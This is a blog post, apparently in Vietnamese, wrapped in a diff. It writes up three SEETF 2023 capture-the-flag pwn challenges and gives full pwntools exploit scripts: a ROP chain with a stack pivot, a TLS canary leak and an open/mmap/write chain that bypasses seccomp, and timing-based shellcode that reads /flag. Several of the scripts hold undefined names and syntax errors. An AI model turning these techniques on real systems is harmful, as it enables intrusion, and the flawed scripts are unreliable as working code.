@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html class="" lang="en-us"><head>
+    
+    <meta name="robots" content="noai, noimageai">
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            SEETF 2023  &ndash;
+        
+        kyrie
+    </title>
+
+    
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>
+
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://w1n-gl0ry.github.io/css/styles.abbd6311bb4b6ca58f8e7398140529245ae0f6428b759fcd830742eee2619eabb900ba9914a9affb82aa9a16a9b9ea727bb315315a976a0db0e7513a5f12c504.css integrity="sha512-q71jEbtLbKWPjnOYFAUpJFrg9kKLdZ/NgwdC7uJhnqu5ALqZFKmv&#43;4Kqmhapuepye7MVMVqXag2w51E6XxLFBA==" />
+<meta name="author" content="w1n-gl0ry" />
+
+    
+        <meta name="keywords" content='ctf, pwn' />
+    
+    
+        <meta name="description" content="Writeup" />
+    
+
+<meta property="og:site_name"
+    content='kyrie' />
+
+    <meta property="og:title" content="SEETF 2023" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="w1n-gl0ry" />
+    <meta
+        property="article:published_time"
+        content='2023-06-12T17:37:11Z&#43;0800' />
+    
+        
+            <meta property="article:tag" content="ctf" />
+        
+            <meta property="article:tag" content="pwn" />
+        
+    
+    <meta property="og:url" content="https://w1n-gl0ry.github.io/posts/seetf/" />
+    
+    
+    <meta property="og:image"
+        content="https://w1n-gl0ry.github.io/icon512.png" />
+    
+        <meta property="og:description" content="Writeup" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='w1n-gl0ry.github.io'
+/>
+<meta property="twitter:url" content="https://w1n-gl0ry.github.io/posts/seetf/" />
+
+
+    <meta name="twitter:title" content="SEETF 2023" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="https://w1n-gl0ry.github.io/icon512.png" />
+    
+        <meta name="twitter:description" content="Writeup" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">kyrie</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts/">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="https://w1n-gl0ry.github.io/about/aboutme/">About</a></li>
+        
+        
+            <li><a href="/tags/">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search/?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="/index.xml">
+    
+    
+        &#xf09e;
+    
+    <span>
+        RSS
+    </span>
+</a>
+
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/w1n-gl0ry">
+    
+    
+        &#xf09b;
+    
+    <span>
+        GitHab
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://twitter.com/w1n-gl0ry">
+    
+    
+        &#xf099;
+    
+    <span>
+        Titter
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>SEETF 2023</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-06-12
+
+</p>
+    
+    
+    
+    <div class="articleToc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#seetf-2023">SEETF 2023</a></li>
+    <li><a href="#great---expectations">Great - Expectations</a></li>
+    <li><a href="#mmap-note">Mmap note</a></li>
+    <li><a href="#shellcode-as-a-service">Shellcode As A Service</a></li>
+  </ul>
+</nav>
+    <hr />
+</div>
+
+    <div><h1 id="seetf-2023">SEETF 2023</h1>
+<p>Some challs in pwns category that I have solved
+Author: lawliet From phis1Ng_</p>
+<h1 id="great---expectations">Great - Expectations</h1>
+<p><code>Description: Ask no questions, and you'll be told no lies. </code></p>
+<p>Ở bài này, trong hàm <code>input_floats()</code> có khai báo mảng buf kiểu char với (3 bytes), nhưng có lỗi khi format nhập vào là %f (4 bytes), nên từ 3 lần ghi đề cho, ta có thể đè nhiều nhất 3 bytes xuống canary (kí tự &lsquo;A&rsquo;) và 2 bytes của saved_rbp của hàm main. Vì vậy, í tưởng ở đây là ta ghi đè 1 byte (hoặc 2 bytes) của saved_rbp để khiến cho ret trỏ tới chuỗi mà ta mong muốn. Đầu chương trình cho ta nhập nhiều nhất 0x107 kí tự, nên ta có thể pivot stack đến đó, để khiến ret trỏ tới chuỗi payload mà ta muốn.
+Để không phải leak libc rồi quay lại hàm main 1 lần nữa thì vì chúng ta có thể ghi đè lên bảng GOT nên ý tưởng của em là dùng ROP để thay đổi địa chỉ của hàm nào đó về one_gadgets, vì offset giữa 2 hàm trong libc luôn cố định nên ta có thể dùng gadget <code>add dword ptr [rbp - 0x3d], ebx ; nop ; ret</code> để cộng/trừ offset sao cho địa chỉ đó trỏ tới one_gadget</p>
+<p>Ta thấy nửa byte đầu của bytes thứ 2 sau LSB của saved_rbp chỉ cách 1 đơn vị so với địa chỉ của buffer mà chương trình cho ta nhập vào. Hơn nữa, byte cuối luôn kết thúc bằng 0x00, 0x10, &hellip;, 0xf0 . Nên ta có cơ hội 1/16 để pivot stack về buffer, xong cộng 1 để bypass check [rbp-1] với A.</p>
+<p><strong>Solve scripts</strong></p>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">#!/usr/bin/env python3
+from pwn import *
+import time
+import sys
+import struct
+
+local = 0
+debug = 0
+
+context.arch = &#39;amd64&#39;
+# context.aslr = False
+context.log_level = &#39;debug&#39;
+# context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#{pane_pid}&#39;, &#39;-P&#39;]
+# context.timeout = 2
+
+def riconn():
+	global local
+	global debug
+
+	for arg in sys.argv[1:]:
+		if arg in (&#39;-l&#39;, &#39;--local&#39;):
+			local = 1
+		if arg in (&#39;-d&#39;, &#39;--debug&#39;):
+			debug = 1
+
+	if local:
+		io = process(&#39;./chall_patched&#39;)
+		if debug:
+			gdb.attach(s, gdbscript=&#39;&#39;&#39;
+            b* 0x00000000004012ae
+            b* 0x00000000004011fc
+            c
+			&#39;&#39;&#39;)
+		else:
+			pass
+	else:
+		io = remote(&#39;win.the.seetf.sg&#39;, 2004)
+
+	return io
+
+
+elf = ELF(&#39;./chall_patched&#39;)
+libc = ELF(&#39;libc.so.6&#39;)
+
+
+pop_rdi = 0x0000000000401313
+pop_rsi_r15 = 0x0000000000401311
+leave_ret = 0x000000000040122c
+pop_rbp = 0x000000000040119d
+ret = 0x000000000040101a
+main = 0x000000000040122e
+main_no_push = main+1
+input_floats = 0x00000000004011b6
+put_gots = 0x404018
+csu = 0x40130a
+add_what_where = 0x000000000040119c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+
+
+def hex_to_float(hex_str):
+    binary_str = bytes.fromhex(hex_str)
+    unpacked = struct.unpack(&#39;!f&#39;, binary_str)
+    return unpacked[0]
+
+try:
+	io = riconn()
+	payload = 0x61*b&#39;A&#39; + 8*b&#39;A&#39; + p64(csu) + p64(0x5f6de) + p64(put_gots+0x3d) + p64(0)*4 + p64(add_what_where) + p64(elf.sym[&#39;puts&#39;])
+	value = &#39;3.544850151698461e-38&#39;
+	io.sendafter(b&#39;ale.\n&#39;,payload)
+	io.sendlineafter(b&#39;number!\n&#39;, b&#39;1&#39;)
+	io.sendlineafter(b&#39;number!\n&#39;, value.encode())
+	io.sendlineafter(b&#39;number!\n&#39;, b&#39;+&#39;)	
+	io.interactive()
+
+except:
+    io.close()
+</code></pre><p><strong>$ flag:</strong> SEE{Im_f33ling_1ucky_e27e006fe918ab56}</p>
+<h1 id="mmap-note">Mmap note</h1>
+<p><code>Description: I made a basic note program but with sandbox. And no more chunk for house of xxx. Can you still get the flag?</code></p>
+<p>Ở bài này, chúng ta có thể allocate 1 số chunks với size 0x1000. Nếu phân bổ hết lượng bộ nhớ trên Heap và khiến cho chunks mới phải dùng mmaped(). Điều đó khiến ta có 1 số chunk nằm trên Thread Local Storage (TLS) được đặt với 1 offset không đổi so với libc trong vùng nhớ.</p>
+<pre tabindex="0"><code>__int64 write_0()
+{
+  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  v1 = 0;
+  printf(&#34;idx = &#34;);
+  __isoc99_scanf(&#34;%d&#34;, &amp;v1);
+  if ( v1 &lt; dword_404590 )
+  {
+    printf(&#34;size to write = &#34;);
+    __isoc99_scanf(&#34;%d&#34;, &amp;sizes[v1]);
+    if ( sizes[v1] &lt;= 4096 )
+    {
+      read(0, (void *)chunk[v1], sizes[v1]);
+      return 1LL;
+    }
+    else
+    {
+      puts(&#34;too much&#34;);
+      return 0LL;
+    }
+  }
+  else
+  {
+    puts(&#34;invalid idx&#34;);
+    return 0LL;
+  }
+}
+</code></pre><p>Lỗi thứ 2 ở hàm write(), ta thấy lỗi integer overflow, nên chúng ta có thể đọc nhiều hơn 0x1000 bytes. Điều này cho phép ta có thể đọc được cả canary được lưu giữ trong 1 offset cố định trên TLS (vì hàm write in ra cả nullbyte).
+Sau đó, chúng ta dùng để dùng rop chain open-&gt;read-&gt;write để ánh xạ file flag vào bộ nhớ chương trình và xuất nó ra thiết bị xuất chuẩn.</p>
+<p>OOPs, chúng ta lại không có read() để đọc file vào bộ nhớ (vì chương trình đã dùng seccomp để chặn các hàm đó lại). May mắn thay, em tìm thấy bài viết này <a href="https://stackoverflow.com/questions/74743307/mmap-open-and-read-from-file">link</a>. Dùng mmap() để read() file. Ok, vậy mọi thứ đã rõ ràng rồi, mình tiến hành exploit:</p>
+<p><strong>Solve scripts</strong></p>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">#!/usr/bin/env python3
+
+from pwn import *
+from ctypes import *
+import time
+import sys
+
+local = 0
+debug = 0
+
+context.arch = &#39;amd64&#39;
+# context.aslr = False
+# context.log_level = &#39;debug&#39;
+# context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#{pane_pid}&#39;, &#39;-P&#39;]
+# context.timeout = 2
+
+def riconn():
+	global local
+	global debug
+
+	for arg in sys.argv[1:]:
+		if arg in (&#39;-l&#39;, &#39;--local&#39;):
+			local = 1
+		if arg in (&#39;-d&#39;, &#39;--debug&#39;):
+			debug = 1
+
+	if local:
+		io = process(&#39;./chall_patched&#39;)
+		if debug:
+			gdb.attach(s, gdbscript=&#39;&#39;&#39;
+            b* 0x0000000000401930
+            b* 0x0000000000401953
+            continue
+			&#39;&#39;&#39;)
+		else:
+			raw_input(&#39;DEBUG&#39;)
+	else:
+		io = remote(&#39;win.the.seetf.sg&#39;, 2002)
+
+	return io
+
+io = conn()
+
+elf = ELF(&#39;./chall_patched&#39;)
+libc = ELF(&#39;libc.so.6&#39;)
+
+pop_rax = 0x0000000000401491
+pop_rdi = 0x000000000040148f
+pop_rsi = 0x0000000000401493
+pop_rsp = 0x00000000004014a0
+pop_r10 = 0x0000000000401497
+pop_r8 = 0x000000000040149a
+pop_r9 = 0x000000000040149d
+pop_rdx = 0x0000000000401495
+
+sys_call = 0x00000000004014a8
+
+# Stage 1 : Leak canary and Libc :
+    
+def create_note():
+    io.sendlineafter(b&#39;&gt; &#39;, b&#39;1&#39;)
+
+def write_note(idx, size=0x1000):
+    io.sendlineafter(b&#39;&gt; &#39;, b&#39;2&#39;)
+    io.sendlineafter(b&#39;idx = &#39;, str(idx).encode())
+    io.sendlineafter(b&#39;size to write = &#39;, f&#34;{size}&#34;.encode())
+
+def read_note(idx):
+    io.sendlineafter(b&#39;&gt; &#39;, b&#39;3&#39;)
+    io.sendlineafter(b&#39;idx = &#39;, str(idx).encode())
+
+
+for i in range(30):
+    create_note()
+    if i ==0:
+        p.recvuntil(b&#34;Addr of note 0 is 0x&#34;)
+        addr_0=int(p.recvuntil(b&#34;\n&#34;).rstrip().decode(),16)
+    sleep(0.1)
+
+write_note(0, size=100, b&#39;flag\0&#39;)
+write_note(3, size=0x1740+0x100) 
+read_note(3)
+
+for i in range(0x10):
+	io.recv(0x100)
+	log.info(&#34;&#34;)
+	sleep(0.5)
+
+sleep(1)
+io.recv(0x760+9-1)
+sleep(1)
+canary = u64(io.recv(8))
+log.info(f&#34;canary = {hex(canary)}&#34;)
+
+payload = b&#39;A&#39;*24 // fill buff and saved_rbp
+payload += flat(pop_rax, 2, pop_rdi, base+0xf00, pop_rsi, 0, pop_rdx, 0,\
+                syscall_ret, pop_rax, 9, pop_rdi, 0x13370000, pop_rsi, 0x1000,\ # open
+                pop_rdx, 7, pop_r10, 2, pop_r8, 3, pop_r9, 0, syscall_ret,\  # mmap
+                pop_rax, 1, pop_rdi, 1, pop_rsi, 0x13370000, pop_rdx, 0x40, syscall_ret) # write
+
+io.sendline(payload)
+io.sendline(b&#39;4&#39;)
+io.interactive()
+</code></pre><p><strong>$ flag:</strong> SEE{m4st3r_0f_mm4p_5ee2a719bc6a8209e7295d4095ff5181}</p>
+<h1 id="shellcode-as-a-service">Shellcode As A Service</h1>
+<p><code>Description: Hey, welcome to my new SaaS platform! As part of our early access program, we are offering the service for FREE. Our generous free tier gives you a whole SIX BYTES of shellcode to run on our server. What are you waiting for? Sign up now!</code></p>
+<p>Như chương trình đã mô tả, chúng ta phải viết shellcode sẽ được đưa vào để thực thi.
+Được cấp cho 6 bytes và có cho phép 2 syscall open, read, ngăn chặn chúng ta in flag ra màn hình. Ý tưởng là chúng ta sẽ viết 1 vòng lặp để kiểm tra từng bit của flag, nếu bit bằng 1 sẽ cho vào 1 vòng lặp, còn ngược lại thì bit bằng 0.
+Một cách khác là ta sẽ đọc từng bytes của flag rồi kiểm tra từng kí tự của flag.</p>
+<p>Ngay lúc này, thanh ghi rdi đang có giá trị bằng 0, rdx thì là địa chỉ nơi mà shellcode chúng ta ghi nên chúng ta chỉ cần lấy giá trị đó là đủ để ghi tiếp (second stage write).</p>
+<p><strong>Solve scripts</strong></p>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">from pwn import *
+import struct
+
+#!/usr/bin/env python3
+
+from pwn import *
+from ctypes import *
+import time
+import sys
+
+local = 0
+debug = 0
+
+context.arch = &#39;amd64&#39;
+# context.aslr = False
+# context.log_level = &#39;debug&#39;
+# context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#{pane_pid}&#39;, &#39;-P&#39;]
+# context.timeout = 2
+
+def riconn():
+	global local
+	global debug
+
+	for arg in sys.argv[1:]:
+		if arg in (&#39;-l&#39;, &#39;--local&#39;):
+			local = 1
+		if arg in (&#39;-d&#39;, &#39;--debug&#39;):
+			debug = 1
+
+	if local:
+		io = process(&#39;./chall&#39;)
+		if debug:
+			gdb.attach(s, gdbscript=&#39;&#39;&#39;
+			&#39;&#39;&#39;)
+		else:
+			raw_input(&#39;DEBUG&#39;)
+	else:
+		io = remote(&#39;103.162.14.240&#39;, 15001)
+
+	return io
+
+
+elf = ELF(&#39;./chall&#39;)
+#libc = ELF(&#39;libc.so.6&#39;)
+
+def chill(offset):
+    bin = &#39;&#39;
+    for bit in range(8):
+        io = riconn()
+        stage1 = asm(f&#34;&#34;&#34;
+        xor edi, edi
+        mov esi, edx
+        syscall
+        &#34;&#34;&#34;, arch=&#39;amd64&#39;)
+
+        io.send(stage1)
+
+        stage2 = asm((&#34;&#34;&#34;
+        .rept 0x6
+        nop
+        .endr
+        &#34;&#34;&#34; 
+            + shellcraft.amd64.linux.open(&#39;/flag&#39;)
+            + shellcraft.amd64.linux.read(&#39;rax&#39;, &#39;rsp&#39;, 0x100)
+            + f&#34;&#34;&#34;
+            xor r11, r11
+            xor rax, rax
+            mov al, [rsp+{offset}]
+            shr al, {bit}
+            shl al, 7
+            shr al, 7
+        loop:
+            cmp rax, r11
+            je end
+            jmp loop
+        end:
+        &#34;&#34;&#34;
+        ), arch=&#39;amd64&#39;)
+
+        io.send(stage2)
+        start = time.time()
+        io.recvall(timeout=1).decode()
+        now = time.time()
+
+        if (now - start) &gt; 1:
+            bin += &#39;1&#39;
+        else:
+            bin += &#39;0&#39;
+
+    byte = int(bin[::-1], 2)
+
+    return byte
+
+
+tmp = []
+for i in range(100):
+    tmp.append(chill(i))
+    if tmp[-1] == &#39;}&#39;:
+        break
+    
+flag = [x.decode(&#39;utf-8&#39;) for x in tmp]
+flag = &#39;&#39;.join(flag)
+</code></pre><p><strong>$ flag:</strong> SEE{n1c3_sh3llc0ding_d6e25f87c7ebeef6e80df23d32c42d00}</p>
+</div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/ctf/">#ctf</a>
+        
+            <a
+                
+                href="/tags/pwn/">#pwn</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2024 &copy; Some copyright notice - <a href="https://example.com/license">my license</a>
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
